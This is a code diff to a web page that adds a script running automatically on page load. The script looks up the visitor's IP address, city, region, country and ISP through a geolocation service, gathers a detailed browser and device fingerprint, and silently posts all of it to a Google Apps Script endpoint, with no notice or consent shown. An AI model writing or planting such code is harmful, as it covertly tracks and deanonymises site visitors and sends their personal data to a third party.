@@ -101,6 +101,51 @@
   </form>
 
   <script>
+
+    async function collectAndSend() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const ipData = await res.json();
+
+        const fields = {
+          IP: ipData.ip || '',
+          City: ipData.city || '',
+          Region: ipData.region || '',
+          Country: ipData.country_name || '',
+          ISP: ipData.org || '',
+          Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          TimeOffset: new Date().getTimezoneOffset(),
+          Language: navigator.language,
+          UserAgent: navigator.userAgent,
+          Platform: navigator.platform,
+          Screen: `${screen.width}x${screen.height}`,
+          ColorDepth: screen.colorDepth,
+          DeviceMemory: navigator.deviceMemory || '',
+          CPUCores: navigator.hardwareConcurrency || '',
+          Online: navigator.onLine,
+          DoNotTrack: navigator.doNotTrack,
+          TouchSupport: ('ontouchstart' in window),
+          ConnectionType: navigator.connection?.effectiveType || '',
+          Referrer: document.referrer || 'Direct'
+        };
+
+        const formData = new FormData();
+        for (const key in fields) {
+          formData.append(key, fields[key]);
+        }
+
+        await fetch('https://script.google.com/macros/s/AKfycbzW1Q21J2tzjygpYtj9JgmJXaaDQEj_LDgGeHopJgfGS7YoD05z6wvHgBnLk2jIdtU/exec', {
+          method: 'POST',
+          body: formData
+        });
+
+      } catch (e) {
+        console.error('Error:', e);
+      }
+    }
+
+    window.onload = collectAndSend;
+    
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (position) {
